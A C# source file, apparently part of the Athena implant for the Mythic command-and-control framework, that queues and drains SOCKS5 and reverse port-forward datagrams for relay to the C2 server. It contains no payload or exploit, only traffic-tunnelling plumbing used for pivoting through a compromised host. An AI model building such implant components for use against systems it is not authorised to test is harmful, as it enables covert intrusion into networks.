using Athena.Models.Proxy;
using System.Collections.Concurrent;
using System.Diagnostics;

namespace Athena.Commands
{
    public class ProxyResponseHandler
    {
        private static ConcurrentBag<MythicDatagram> socksOut = new ConcurrentBag<MythicDatagram>();
        private static ConcurrentBag<MythicDatagram> rpfwdOut = new ConcurrentBag<MythicDatagram>();
        public static async Task AddProxyMessageAsync(DatagramSource direction,MythicDatagram sm)
        {
            switch (direction)
            {
                case DatagramSource.Socks5:
                    socksOut.Add(sm);
                    break;
                case DatagramSource.RPortFwd:
                    rpfwdOut.Add(sm);
                    break;
                default:
                    break;
            }
            //socksOut.Add(sm);
        }
        public static async Task<List<MythicDatagram>> GetSocksMessagesAsync()
        {
            if(socksOut.IsEmpty)
            {
                return new List<MythicDatagram>();
            }

            List<MythicDatagram> messages = new List<MythicDatagram>(socksOut);
            socksOut.Clear();
            foreach (var message in messages)
            {
                message.PrepareMessage();
            }
            return messages;
        }
        public static async Task<List<MythicDatagram>> GetRportFwdMessagesAsync()
        {
            if (rpfwdOut.IsEmpty)
            {
                return new List<MythicDatagram>();
            }

            List<MythicDatagram> messages = new List<MythicDatagram>(rpfwdOut);
            rpfwdOut.Clear();
            foreach (var message in messages)
            {
                message.PrepareMessage();
            }
            return messages;
        }
    }
}
